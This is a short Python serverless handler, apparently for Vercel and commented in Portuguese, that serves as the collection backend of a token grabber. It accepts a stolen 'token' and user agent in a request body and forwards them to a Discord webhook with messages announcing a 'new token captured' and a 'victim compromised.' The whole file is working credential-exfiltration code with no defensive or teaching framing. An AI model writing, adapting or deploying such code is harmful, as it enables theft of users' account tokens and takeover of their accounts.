import json
import urllib.request

def handler(request):
    # Configuração do Webhook (Duplicado para segurança, ou use Environment Variable)
    WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_TOKEN"
    
    try:
        data = json.loads(request.body)
        token = data.get('token')
        ua = data.get('ua', 'Unknown')
        
        # Se não achar token, pode ser erro ou cache limpo
        if not token:
            return {"status": "ok", "msg": "No token found"}, 200

        # Prepara payload pro Discord
        discord_payload = {
            "content": f"💀 **NOVO TOKEN CAPTURADO!** 💀\n\n**Token:**\n```\n{token}\n```",
            "embeds": [{
                "title": "🔥 VÍTIMA COMPROMETIDA 🔥",
                "color": 16753920,
                "fields": [{"name": "User Agent", "value": ua, "inline": False}]
            }],
            "username": "XORTRON_VERCEL"
        }

        # Envia requisição pro Webhook
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(discord_payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)

        return {"status": "captured"}, 200

    except Exception as e:
        return {"status": "error", "msg": str(e)}, 500
